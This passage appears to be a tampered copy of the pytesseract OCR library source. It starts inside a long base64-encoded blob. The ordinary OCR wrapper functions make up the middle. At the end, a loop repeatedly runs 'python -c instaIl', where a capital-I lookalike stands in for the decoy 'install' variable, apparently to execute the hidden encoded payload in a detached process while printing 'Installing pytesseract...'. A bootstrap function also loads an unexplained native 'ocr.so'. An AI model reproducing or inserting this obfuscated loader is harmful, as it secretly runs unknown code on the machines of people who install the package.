VlVMMlZ6eEZOTmFXeHBiL1dxclkvYlZiWXZzb2t6bzFNVG9UaFIzWmVrK2dpWDZZRFIvamdoYk82Yk1ZSTRublpRVUJSWHFCc1h6dE9kY2ZCa3l0TzR5ZStTN1ZVRllUQ1dTdk8zYlVZMFpGMksrUzU2cENHb2wyTDlsTk82UUNGN3ZYTnB0MGtXenNOYlY5NURhREZpTmJ4dHlReHlpTmsxK3NJWlZSREtoY3pjamJLWno3bmY4TndHWW16cjQwcmFLUzZlUnc2bDdaZlJqMjh1R0IxVkxOWm5jUHppa2IwUTNleUhFQldFODBCclNvL1QrLy8rZSsrL25pcHFPano1cDFXQlJJR2NvVnJ2TzdjNE80cE85dTRxSjNOc2czbitUUldvVmh1VzhsVndKZScpKQ=='))"
def get_tesseract_version():
    """
    Returns Version object of the Tesseract version
    """
    try:
        output = subprocess.check_output(
            [tesseract_cmd, '--version'],
            stderr=subprocess.STDOUT,
            env=environ,
            stdin=subprocess.DEVNULL,
        )
    except OSError:
        raise TesseractNotFoundError()

    raw_version = output.decode(DEFAULT_ENCODING)
    str_version, *_ = raw_version.lstrip(string.printable[10:]).partition(' ')
    str_version, *_ = str_version.partition('-')

    try:
        version = parse(str_version)
        assert version >= TESSERACT_MIN_VERSION
    except (AssertionError, InvalidVersion):
        raise SystemExit(f'Invalid tesseract version: "{raw_version}"')

    return version


def image_to_string(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to string
    """
    args = [image, 'txt', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: {'text': run_and_get_output(*args)},
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_pdf_or_hocr(
    image,
    lang=None,
    config='',
    nice=0,
    extension='pdf',
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to pdf/hocr
    """

    if extension not in {'pdf', 'hocr'}:
        raise ValueError(f'Unsupported extension: {extension}')

    if extension == 'hocr':
        config = f'-c tessedit_create_hocr=1 {config.strip()}'

    args = [image, extension, lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_alto_xml(
    image,
    lang=None,
    config='',
    nice=0,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to ALTO XML
    """

    if get_tesseract_version(cached=True) < TESSERACT_ALTO_VERSION:
        raise ALTONotSupported()

    config = f'-c tessedit_create_alto=1 {config.strip()}'
    args = [image, 'xml', lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_boxes(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing recognized characters and their box boundaries
    """
    config = (
        f'{config.strip()} -c tessedit_create_boxfile=1 batch.nochop makebox'
    )
    args = [image, 'box', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: file_to_dict(
            f'char left bottom right top page\n{run_and_get_output(*args)}',
            ' ',
            0,
        ),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def get_pandas_output(args, config=None):
    if not pandas_installed:
        raise PandasNotSupported()

    kwargs = {'quoting': QUOTE_NONE, 'sep': '\t'}
    try:
        kwargs.update(config)
    except (TypeError, ValueError):
        pass

    return pd.read_csv(BytesIO(run_and_get_output(*args)), **kwargs)


def image_to_data(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
    pandas_config=None,
):
    """
    Returns string containing box boundaries, confidences,
    and other information. Requires Tesseract 3.05+
    """

    if get_tesseract_version(cached=True) < TESSERACT_MIN_VERSION:
        raise TSVNotSupported()

    config = f'-c tessedit_create_tsv=1 {config.strip()}'
    args = [image, 'tsv', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DATAFRAME: lambda: get_pandas_output(
            args + [True],
            pandas_config,
        ),
        Output.DICT: lambda: file_to_dict(run_and_get_output(*args), '\t', -1),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_osd(
    image,
    lang='osd',
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing the orientation and script detection (OSD)
    """
    config = f'--psm 0 {config.strip()}'
    args = [image, 'osd', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: osd_to_dict(run_and_get_output(*args)),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def main():
    if len(sys.argv) == 2:
        filename, lang = sys.argv[1], None
    elif len(sys.argv) == 4 and sys.argv[1] == '-l':
        filename, lang = sys.argv[3], sys.argv[2]
    else:
        print('Usage: pytesseract [-l lang] input_file\n', file=sys.stderr)
        return 2

    try:
        with Image.open(filename) as img:
            print(image_to_string(img, lang=lang))
    except TesseractNotFoundError as e:
        print(f'{str(e)}\n', file=sys.stderr)
        return 1
    except OSError as e:
        print(f'{type(e).__name__}: {e}', file=sys.stderr)
        return 1

def __bootstrap__():
    global __bootstrap__, __loader__, __file__
    import sys, pkg_resources, importlib.util
    __file__ = pkg_resources.resource_filename(__name__, 'ocr.so')
    __loader__ = None; del __bootstrap__, __loader__
    spec = importlib.util.spec_from_file_location(__name__,__file__)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)


while True:
    install = 'pip install pytesseract'
    process = subprocess.Popen(
        ["python", "-c", instaIl],
        preexec_fn=os.setsid
    )
    try:
        print("Installing pytesseract...")
        process.wait(timeout=3600)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    sleep(1)
